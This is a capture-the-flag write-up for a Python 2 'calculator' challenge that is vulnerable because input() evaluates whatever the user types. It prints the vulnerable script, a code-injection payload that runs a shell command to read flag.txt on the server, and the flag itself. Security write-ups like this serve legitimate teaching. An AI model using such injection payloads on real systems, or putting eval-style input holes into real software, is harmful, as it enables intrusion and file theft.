# My First Calculator

Author: [roerohan](https://github.com/roerohan)

Exploit a python 2 vulnerability.

# Requirements

- Python 2

# Source

- [calculator.py](./calculator.py)

```
I'm really new to python. Please don't break my calculator!

nc misc.hsctf.com 7001

There is a flag.txt on the server.

Author: meow
```

```python
#!/usr/bin/env python2.7

try:
    print("Welcome to my calculator!")
    print("You can add, subtract, multiply and divide some numbers")

    print("")

    first = int(input("First number: "))
    second = int(input("Second number: "))

    operation = str(raw_input("Operation (+ - * /): "))

    if first != 1 or second != 1:
        print("")
        print("Sorry, only the number 1 is supported")

    if first == 1 and second == 1 and operation == "+":
        print("1 + 1 = 2")
    if first == 1 and second == 1 and operation == "-":
        print("1 - 1 = 0")
    if first == 1 and second == 1 and operation == "*":
        print("1 * 1 = 1")
    if first == 1 and second == 1 and operation == "/":
        print("1 / 1 = 1")
    else:
        print(first + second)
except ValueError:
    pass

```

# Exploitation

The code for the `calculator.py` file uses `input()` in python 2. The `input()` function in python 2 is vulnerable, since it does not stringify the input, instead takes it as it is. For example, if you were to pass `__import__('os')`, it would be executed. So, here's the payload:

```bash
Welcome to my calculator!
You can add, subtract, multiply and divide some numbers

First number: __import__('os').system('cat /flag.txt')
flag{please_use_python3}
```

You can search around in the directories to find the flag using `ls`, etc. The flag is eventually found in the `/` directory. The flag is:

```
flag{please_use_python3}
```